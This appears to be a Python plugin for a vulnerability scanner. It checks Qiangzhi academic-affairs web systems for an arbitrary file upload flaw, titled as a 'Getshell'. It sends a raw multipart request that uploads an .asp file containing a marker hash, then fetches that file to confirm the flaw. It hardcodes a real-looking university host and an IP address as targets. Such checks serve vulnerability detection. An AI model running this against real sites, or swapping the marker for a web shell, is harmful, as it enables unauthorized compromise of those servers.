#!/usr/bin/evn python
#-*-:coding:utf-8 -*-
#Author:404
#Name:强智教务系统通杀Getshell
#Refer:http://www.wooyun.org/bugs/wooyun-2010-074367

def assign(service,arg):
    if service=="qiangzhi_jw":
        return True,arg 
    


def  audit(arg):
    raw1='''
POST /jiaowu/jwgl/jcxx/savetofile.asp HTTP/1.1
Host: jwc.whhhxy.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: keep-alive
Content-Type: multipart/form-data; boundary=---------------------------496647414724
Content-Length: 304

-----------------------------496647414724
Content-Disposition: form-data; name="uploadfile"; filename="1.asp"
Content-Type: application/octet-stream

c42ca4238a0b923820dcc509a6f75849b
-----------------------------496647414724
Content-Disposition: form-data; name="Button2"

ÉÏ´«
-----------------------------496647414724--
'''
    url=arg+"jwgl/jcxx/savetofile.asp"
    url2=arg+"jwgl/jcxx/1.asp"

    code,head,res,errcode,_=curl.curl2(url,raw=raw1)
    code1,head1,res1,errcode,_=curl.curl2(url2)
    if code==200 and 'c42ca4238a0b923820dcc509a6f75849b' in res1:
            security_hole(url)

if __name__=="__main__":
    from dummy import *

    audit(assign('qiangzhi_jw','http://jwc.whhhxy.com/jiaowu/')[1])
    # audit(assign('qiangzhi_jw','http://220.168.57.74/')[1])